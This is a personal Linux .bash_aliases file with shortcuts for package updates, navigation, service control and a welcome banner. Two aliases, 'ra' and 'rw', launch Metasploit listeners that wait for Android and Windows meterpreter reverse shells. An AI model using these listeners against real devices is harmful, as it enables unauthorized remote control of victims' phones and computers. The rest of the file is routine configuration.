# Copy this .bash_aliases file to the /root folder
alias cba='sudo cp $HOME/.bash_aliases /root/.bash_aliases'
alias rb='source ~/.bashrc'

alias ud='sudo apt update -y'
alias ug='sudo apt upgrade -y'
alias u='sudo apt update -y && sudo apt upgrade -y'
alias U='sudo apt update -y && sudo apt upgrade -y && sudo apt dist-upgrade -y'
alias list='apt list --upgradable'
alias install='sudo apt install'
alias remove='sudo apt remove --purge'
alias try='sudo apt install --dry-run'

alias b='cd ..'
alias B='cd ..'
alias c='clear'
alias C='clear'
alias r='reset'
alias R='reset'
alias e='exit'
alias E='exit'
alias d='cd $HOME/Escritorio'
alias D='cd $HOME/Escritorio'
alias h='cd $HOME'
alias H='cd $HOME'
alias gh='cd $HOME/GitHub'
alias GH='cd $HOME/GitHub'
alias tmp='cd $HOME/Escritorio/tmp'
alias TMP='cd $HOME/Escritorio/tmp'
alias www='cd /var/www/html'
alias WWW='cd /var/www/html'

alias ll='ls -hl'
alias la='ls -ahl'
alias cn='cat -n'
alias hn='head -n'
alias tn='tail -n'
alias nano='nano -l'
alias s='grep --color=always -ie'
alias S='grep --color=always -ie'
alias CC='xclip -selection clipboard'

alias open='xdg-open'
alias et='exiftool'
alias cl='exiftool -all='
alias bb='bleachbit'
alias sbb='sudo bleachbit'
alias st='speedtest'

alias p='python2'
alias P='python3'

alias bt='sudo service bluetooth'
alias bts='sudo service bluetooth start'
alias btp='sudo service bluetooth stop'
alias bst='blueman-sendto'
alias db='sudo service mysql'
alias svr='sudo service apache2'
alias on='sudo service mysql start && sudo service apache2 start'
alias off='sudo service mysql stop && sudo service apache2 stop'

alias p2='ping -4 -c 2'
alias p4='ping -4 -c 4'
alias ifconfig='/sbin/ifconfig'
alias tun=getTunIP; function getTunIP() { ifconfig tun0 | awk 'NR==2 {print $2}'; }

alias ra='msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.10; run"'
alias rw='msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; run"'

alias clima='curl http://www.wttr.in/'

alias welcome=banner;
function banner() {
  echo -e "\n"
  echo "              ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗       ██╗   ██╗███████╗███████╗██████╗        ██╗              "
  echo "              ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝       ██║   ██║██╔════╝██╔════╝██╔══██╗    ██╗╚██╗             "
  echo "              ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗         ██║   ██║███████╗█████╗  ██████╔╝    ╚═╝ ██║             "
  echo "              ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝         ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██╗ ██║             "
  echo "              ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗▄█╗    ╚██████╔╝███████║███████╗██║  ██║    ╚═╝██╔╝             "
  echo "               ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝              "
  echo -e "\n"
}
